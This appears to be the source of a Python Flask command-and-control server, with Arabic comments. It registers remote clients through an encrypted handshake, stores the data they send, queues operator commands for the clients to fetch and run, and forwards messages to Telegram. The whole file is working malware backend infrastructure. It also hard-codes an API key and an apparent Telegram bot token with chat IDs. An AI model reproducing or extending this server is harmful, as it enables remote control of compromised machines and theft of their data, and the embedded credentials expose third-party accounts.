from flask import Flask, request, jsonify, Response
from flask_cors import CORS
import time
import requests
import json
import base64
import subprocess
import os
import logging
import sqlite3
import csv
import io
from datetime import datetime
from functools import wraps
from collections import defaultdict
from encryption import (
    hybrid_decrypt_first_message, 
    hybrid_encrypt, 
    hybrid_decrypt,
    aes_encrypt,
    aes_decrypt
)

app = Flask(__name__)

# ======================== تفعيل CORS ========================
CORS(app)

# ======================== إعداد نظام التسجيل (Logging) ========================
if not os.path.exists('logs'):
    os.makedirs('logs')

log_filename = f'logs/c2_server_{datetime.now().strftime("%Y%m%d")}.log'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_filename),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

# ======================== إعدادات الأمان ========================
API_KEY = "c2_super_secret_key_2026_123456"
RATE_LIMIT_REQUESTS = 20
RATE_LIMIT_WINDOW = 60

rate_limits = defaultdict(list)

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('X-API-Key')
        if token != API_KEY:
            logger.warning(f"Unauthorized access attempt from {request.remote_addr}")
            return jsonify({"error": "Unauthorized", "message": "Invalid API Key"}), 401
        return f(*args, **kwargs)
    return decorated

def rate_limit(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        ip = request.remote_addr
        now = time.time()
        
        rate_limits[ip] = [t for t in rate_limits[ip] if now - t < RATE_LIMIT_WINDOW]
        
        if len(rate_limits[ip]) >= RATE_LIMIT_REQUESTS:
            logger.warning(f"Rate limit exceeded for {ip}")
            return jsonify({"error": "Rate limit exceeded"}), 429
        
        rate_limits[ip].append(now)
        return f(*args, **kwargs)
    return decorated

# ======================== إعداد قاعدة البيانات ========================
DB_PATH = 'c2_database.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clients (
            id TEXT PRIMARY KEY,
            last_seen REAL,
            os TEXT,
            hostname TEXT,
            ip_address TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp REAL,
            type TEXT,
            data TEXT,
            client_id TEXT,
            chat_id TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command TEXT,
            client_id TEXT,
            status TEXT,
            result TEXT,
            created_at REAL,
            executed_at REAL
        )
    ''')
    
    conn.commit()
    conn.close()
    logger.info("✅ Database initialized")

def save_log_to_db(timestamp, log_type, data, client_id=None, chat_id=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO logs (timestamp, type, data, client_id, chat_id)
            VALUES (?, ?, ?, ?, ?)
        ''', (timestamp, log_type, data, client_id, chat_id))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Failed to save log to DB: {e}")

def save_client_to_db(client_id, last_seen, os_info=None, hostname=None, ip=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO clients (id, last_seen, os, hostname, ip_address)
            VALUES (?, ?, ?, ?, ?)
        ''', (client_id, last_seen, os_info, hostname, ip))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Failed to save client to DB: {e}")

def save_command_to_db(command, client_id, status="pending"):
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO commands (command, client_id, status, created_at)
            VALUES (?, ?, ?, ?)
        ''', (command, client_id, status, time.time()))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Failed to save command to DB: {e}")

def load_data_from_db():
    global clients, clients_data, commands
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('SELECT id, last_seen FROM clients')
        for row in cursor.fetchall():
            clients[row[0]] = {"last_seen": row[1]}
        
        cursor.execute('SELECT timestamp, type, data, client_id, chat_id FROM logs ORDER BY id DESC LIMIT 1000')
        for row in cursor.fetchall():
            log_entry = {
                "timestamp": row[0],
                "type": row[1],
                "data": row[2]
            }
            if row[3]:
                log_entry["client_id"] = row[3]
            if row[4]:
                log_entry["chat_id"] = row[4]
            clients_data.append(log_entry)
        
        cursor.execute('SELECT command, client_id FROM commands WHERE status = "pending"')
        for row in cursor.fetchall():
            commands.append(row[0])
        
        conn.close()
        logger.info(f"📦 Loaded {len(clients)} clients, {len(clients_data)} logs, {len(commands)} commands from DB")
    except Exception as e:
        logger.error(f"Failed to load data from DB: {e}")

# ======================== البيانات في الذاكرة ========================
sessions = {}
clients_data = []
clients = {}
commands = []

# ======================== إعدادات Telegram ========================
TOKEN = "8782474352:AAEK1FCeLrNMqnGXPLgLJfJQ1qmiHV9i9d4"
CHAT_ID_PERSONAL = "7604675763"
CHAT_ID_GROUP = "-1002470378114"
CHAT_ID_CHANNEL = "-1002426552780"
ALL_CHATS = [CHAT_ID_PERSONAL, CHAT_ID_GROUP, CHAT_ID_CHANNEL]

# ======================== دوال مساعدة ========================
def check_bot_status():
    try:
        result = subprocess.run(["pgrep", "-f", "bot.py"], capture_output=True, text=True)
        return "running" if result.stdout.strip() else "stopped"
    except:
        return "unknown"

# ======================== 1. Handshake ========================
@app.route("/handshake", methods=["POST"])
@rate_limit
def handshake():
    data = request.json
    encrypted_key = data.get("encrypted_key")
    encrypted_data = data.get("encrypted_data")
    client_id = data.get("client_id")
    
    logger.info(f"🟡 Handshake request from client: {client_id}")
    
    try:
        decrypted_data, aes_key = hybrid_decrypt_first_message(encrypted_key, encrypted_data)
        sessions[client_id] = aes_key
        clients[client_id] = {"last_seen": time.time()}
        save_client_to_db(client_id, time.time())
        
        clients_data.append(json.loads(decrypted_data))
        save_log_to_db(time.time(), "handshake", decrypted_data, client_id)
        
        logger.info(f"✅ Handshake successful with {client_id}")
        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"❌ Handshake failed with {client_id}: {e}")
        return jsonify({"status": "failed"}), 400

# ======================== 2. استقبال البيانات ========================
@app.route("/data", methods=["POST"])
@rate_limit
def receive_data():
    data = request.json
    client_id = data.get("client_id")
    encrypted_data = data.get("encrypted_data")
    
    if client_id == "telegram":
        try:
            from crypto_utils import decrypt_data
            raw = base64.b64decode(encrypted_data)
            decrypted_text = decrypt_data(raw).decode('utf-8')

            result = {
                "type": data.get("type"),
                "data": decrypted_text,
                "chat_id": data.get("chat_id")
            }

            logger.info(f"📱 Telegram message: {decrypted_text}")
            clients_data.append(result)
            save_log_to_db(time.time(), "telegram", decrypted_text, chat_id=data.get('chat_id'))
            return "OK"
        except Exception as e:
            logger.error(f"Telegram Decrypt Error: {e}")
            return "Error", 400
    
    if client_id not in sessions:
        test_prefixes = ("test_", "stress_test", "Test", "kali", "agent")
        if client_id.startswith(test_prefixes) or client_id in ["test_client", "kali", "agent1"]:
            sessions[client_id] = None
            clients[client_id] = {"last_seen": time.time()}
            save_client_to_db(client_id, time.time())
            logger.info(f"📝 Test client auto-registered: {client_id}")
        else:
            logger.warning(f"⚠️ No session for {client_id}")
            return "No session, need handshake", 401
    
    try:
        if encrypted_data and sessions.get(client_id) and sessions[client_id] is not None:
            decrypted_str = hybrid_decrypt(sessions[client_id], encrypted_data)
            decrypted = json.loads(decrypted_str)
            logger.info(f"🔓 Decrypted from {client_id}: {decrypted}")
            clients_data.append(decrypted)
            save_log_to_db(time.time(), "decrypted", decrypted_str, client_id)
        else:
            decrypted = data
            logger.info(f"📄 Plain from {client_id}: {decrypted}")
            clients_data.append(decrypted)
            save_log_to_db(time.time(), "plain", json.dumps(decrypted), client_id)
        
        if client_id in clients:
            clients[client_id]["last_seen"] = time.time()
            save_client_to_db(client_id, time.time())
        
        return "OK"
    except Exception as e:
        logger.error(f"Decryption error: {e}")
        return "Decryption failed", 400

# ======================== 3. استقبال الأوامر ========================
@app.route("/command", methods=["POST"])
@rate_limit
@require_auth
def receive_command():
    data = request.json
    cmd = data.get("command")
    client_id = data.get("client_id", "all")
    
    logger.warning(f"💀 Command received: {cmd} for {client_id}")
    commands.append(cmd)
    save_command_to_db(cmd, client_id)
    return "Command received"

# ======================== 4. سحب الأوامر ========================
@app.route("/get_command", methods=["GET"])
@rate_limit
def get_command():
    if commands:
        cmd = commands.pop(0)
        logger.info(f"📤 Command sent: {cmd}")
        return jsonify({"command": cmd})
    return jsonify({"command": None})

# ======================== 5. إرسال أمر لجهاز معين ========================
@app.route("/send_command", methods=["POST"])
@rate_limit
@require_auth
def send_command():
    data = request.json
    client_id = data.get("client_id")
    command = data.get("command")
    
    if client_id not in sessions:
        return "No session", 401
    
    if sessions[client_id] is not None:
        encrypted_cmd = hybrid_encrypt(sessions[client_id], command)
        commands.append({"client_id": client_id, "encrypted_cmd": encrypted_cmd})
    else:
        commands.append(command)
    
    save_command_to_db(command, client_id)
    logger.info(f"✅ Command stored for {client_id}")
    return "Command stored"

# ======================== 6. سحب أوامر مشفرة ========================
@app.route("/get_command_encrypted", methods=["POST"])
@rate_limit
def get_command_encrypted():
    data = request.json
    client_id = data.get("client_id")
    
    if client_id not in sessions:
        return jsonify({"command": None})
    
    for i, cmd in enumerate(commands):
        if isinstance(cmd, dict) and cmd.get("client_id") == client_id:
            commands.pop(i)
            return jsonify({"command": cmd["encrypted_cmd"]})
    
    return jsonify({"command": None})

# ======================== 7. عرض السجلات ========================
@app.route("/get", methods=["GET"])
@rate_limit
def get_data():
    return jsonify(clients_data)

# ======================== 8. عرض الأجهزة ========================
@app.route("/clients", methods=["GET"])
@rate_limit
def get_clients():
    readable = {}
    for cid, info in clients.items():
        readable[cid] = {"last_seen": time.ctime(info["last_seen"]), "timestamp": info["last_seen"]}
    return jsonify(readable)

# ======================== 9. إرسال لتليجرام ========================
@app.route("/send_to_telegram", methods=["POST"])
@rate_limit
@require_auth
def send_to_telegram():
    data = request.json
    message = data.get("message")
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    
    results = []
    for chat_id in ALL_CHATS:
        try:
            requests.post(url, data={"chat_id": chat_id, "text": message})
            results.append({"chat_id": chat_id, "status": "sent"})
        except Exception as e:
            results.append({"chat_id": chat_id, "error": str(e)})
    
    return jsonify({"results": results})

# ======================== 10. مسح السجلات ========================
@app.route("/clear", methods=["DELETE"])
@rate_limit
@require_auth
def clear_logs():
    global clients_data
    clients_data = []
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute('DELETE FROM logs')
        conn.commit()
        conn.close()
    except:
        pass
    return jsonify({"status": "cleared"})

# ======================== 11. إحصائيات ========================
@app.route("/stats", methods=["GET"])
@rate_limit
def get_stats():
    uptime = time.time() - app.start_time
    return jsonify({
        "total_clients": len(clients),
        "total_logs": len(clients_data),
        "pending_commands": len([c for c in commands if isinstance(c, str)]),
        "server_uptime": f"{int(uptime//3600)}h {int((uptime%3600)//60)}m",
        "bot_status": check_bot_status()
    })

# ======================== 12. تحديث إعدادات تليجرام ========================
@app.route("/update_telegram_settings", methods=["POST"])
@rate_limit
@require_auth
def update_telegram_settings():
    global TOKEN, ALL_CHATS
    data = request.json
    if "token" in data:
        TOKEN = data["token"]
    if "chat_ids" in data:
        ALL_CHATS = data["chat_ids"]
    return jsonify({"status": "updated"})

# ======================== 13. اختبار ========================
@app.route("/test_data", methods=["POST"])
@rate_limit
def test_data():
    data = request.json
    clients_data.append(data)
    return "OK"

# ======================== 14. مراقبة الصحة ========================
@app.route("/health", methods=["GET"])
def health_check():
    return jsonify({"status": "healthy", "uptime": time.time() - app.start_time})

# ======================== 15. تصدير CSV ========================
@app.route("/export/logs", methods=["GET"])
@rate_limit
@require_auth
def export_logs():
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["Timestamp", "Type", "Data", "Client ID", "Chat ID"])
    for log in clients_data:
        writer.writerow([
            time.ctime(log.get("timestamp", time.time())),
            log.get("type", ""),
            log.get("data", ""),
            log.get("client_id", ""),
            log.get("chat_id", "")
        ])
    return Response(output.getvalue(), mimetype="text/csv", headers={"Content-Disposition": "attachment;filename=logs.csv"})

# ======================== 16. تاريخ الأوامر ========================
@app.route("/commands/history", methods=["GET"])
@rate_limit
@require_auth
def commands_history():
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT id, command, client_id, status, created_at FROM commands ORDER BY id DESC LIMIT 100')
        rows = cursor.fetchall()
        conn.close()
        history = []
        for row in rows:
            history.append({
                "id": row[0],
                "command": row[1],
                "client_id": row[2],
                "status": row[3],
                "created_at": time.ctime(row[4]) if row[4] else None
            })
        return jsonify(history)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ======================== التشغيل ========================
init_db()
load_data_from_db()
app.start_time = time.time()
logger.info("🚀 C2 Server Started")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)